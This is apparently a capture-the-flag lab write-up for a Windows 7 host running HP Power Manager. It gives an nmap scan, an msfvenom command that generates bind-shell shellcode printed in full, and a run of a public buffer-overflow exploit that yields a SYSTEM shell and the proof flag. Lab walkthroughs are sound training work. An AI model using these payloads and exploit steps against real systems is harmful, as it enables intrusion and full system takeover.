---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/payload/msfvenom
type: machine
platform: pg
os: windows
ip: 192.168.60.45
ports: [80, 135, 139, 445, 3389, 3573]
services: [http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn, tag-ups-1]
status: solved
tech_count: 1
---
```bash
??(kali?kali)-[~/Kevin]
??$ sudo nmap -sV -sC -p- -O 192.168.60.45      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 01:37 +0000
Nmap scan report for 192.168.60.45
Host is up (0.00033s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.60.45/index.asp
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-06-29T01:09:02
|_Not valid after:  2026-12-29T01:09:02
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-06-30T01:39:01+00:00
|_ssl-date: 2026-06-30T01:39:09+00:00; 0s from scanner time.
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
OS details: Microsoft Windows 7 or Windows Server 2008 R2, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
Network Distance: 2 hops
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-30T01:39:01
|_  start_date: 2026-06-30T01:09:56
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-29T18:39:01-07:00
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:95:5a (VMware)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.97 seconds


???(kali?kali)-[~/Kevin]
??$ git clone https://github.com/Muhammd/HP-Power-Manager.git
Cloning into 'HP-Power-Manager'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6 (from 1)
Receiving objects: 100% (6/6), done.


???(kali?kali)-[~/Kevin]
??$ msfvenom -p windows/shell_bind_tcp LHOST=192.168.49.60 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 352 (iteration=0)
x86/call4_dword_xor chosen with final size 352
Payload size: 352 bytes
Final size of python file: 1749 bytes
buf =  b""
buf += b"\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x88\x9f\x85\x9f\x83\xee\xfc\xe2\xf4"
buf += b"\x74\x77\x07\x9f\x88\x9f\xe5\x16\x6d\xae\x45\xfb"
buf += b"\x03\xcf\xb5\x14\xda\x93\x0e\xcd\x9c\x14\xf7\xb7"
buf += b"\x87\x28\xcf\xb9\xb9\x60\x29\xa3\xe9\xe3\x87\xb3"
buf += b"\xa8\x5e\x4a\x92\x89\x58\x67\x6d\xda\xc8\x0e\xcd"
buf += b"\x98\x14\xcf\xa3\x03\xd3\x94\xe7\x6b\xd7\x84\x4e"
buf += b"\xd9\x14\xdc\xbf\x89\x4c\x0e\xd6\x90\x7c\xbf\xd6"
buf += b"\x03\xab\x0e\x9e\x5e\xae\x7a\x33\x49\x50\x88\x9e"
buf += b"\x4f\xa7\x65\xea\x7e\x9c\xf8\x67\xb3\xe2\xa1\xea"
buf += b"\x6c\xc7\x0e\xc7\xac\x9e\x56\xf9\x03\x93\xce\x14"
buf += b"\xd0\x83\x84\x4c\x03\x9b\x0e\x9e\x58\x16\xc1\xbb"
buf += b"\xac\xc4\xde\xfe\xd1\xc5\xd4\x60\x68\xc0\xda\xc5"
buf += b"\x03\x8d\x6e\x12\xd5\xf7\xb6\xad\x88\x9f\xed\xe8"
buf += b"\xfb\xad\xda\xcb\xe0\xd3\xf2\xb9\x8f\x60\x50\x27"
buf += b"\x18\x9e\x85\x9f\xa1\x5b\xd1\xcf\xe0\xb6\x05\xf4"
buf += b"\x88\x60\x50\xf5\x80\xc6\xd5\x7d\x75\xdf\xd5\xdf"
buf += b"\xd8\xf7\x6f\x90\x57\x7f\x7a\x4a\x1f\xf7\x87\x9f"
buf += b"\x8c\x4d\x0c\x79\xe2\x8f\xd3\xc8\xe0\x5d\x5e\xa8"
buf += b"\xef\x60\x50\xc8\xe0\x28\x6c\xa7\x77\x60\x50\xc8"
buf += b"\xe0\xeb\x69\xa4\x69\x60\x50\xc8\x1f\xf7\xf0\xf1"
buf += b"\xc5\xfe\x7a\x4a\xe0\xfc\xe8\xfb\x88\x16\x66\xc8"
buf += b"\xdf\xc8\xb4\x69\xe2\x8d\xdc\xc9\x6a\x62\xe3\x58"
buf += b"\xcc\xbb\xb9\x9e\x89\x12\xc1\xbb\x98\x59\x85\xdb"
buf += b"\xdc\xcf\xd3\xc9\xde\xd9\xd3\xd1\xde\xc9\xd6\xc9"
buf += b"\xe0\xe6\x49\xa0\x0e\x60\x50\x16\x68\xd1\xd3\xd9"
buf += b"\x77\xaf\xed\x97\x0f\x82\xe5\x60\x5d\x24\x65\x82"
buf += b"\xa2\x95\xed\x39\x1d\x22\x18\x60\x5d\xa3\x83\xe3"
buf += b"\x82\x1f\x7e\x7f\xfd\x9a\x3e\xd8\x9b\xed\xea\xf5"
buf += b"\x88\xcc\x7a\x4a"


???(kali?kali)-[~/Kevin/HP-Power-Manager]
??$ python2 hpm_exploit.py 192.168.60.45

##//#############################################################################################################
##                                                      ##                                               #
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow           #
##                                                      ##  HP Power Manager                             #
## Vulnerable Application: HP Power Manager             ##  This is a part of the Metasploit Module,     #
## Tested on Windows [Version 6.1.7600]                 ##  exploit/windows/http/hp_power_manager_filename#
##                                                      ##                                               #
## Author: Muhammad Haidari                             ##  Spawns a shell to same window                #
## Contact: ghmh@outlook.com                            ##                                               #
## Website: www.github.com/muhammd                      ##                                               #
##                                                      ##                                               #
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>

[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.60.45] 1234 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami 
whoami
nt authority\system


C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A451-A4B1

 Directory of C:\Users\Administrator\Desktop

07/09/2020  07:24 PM    <DIR>          .
07/09/2020  07:24 PM    <DIR>          ..
06/29/2026  08:59 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)   1,783,939,072 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
4b506d7e0c989b3b7053f9081881a8d3





```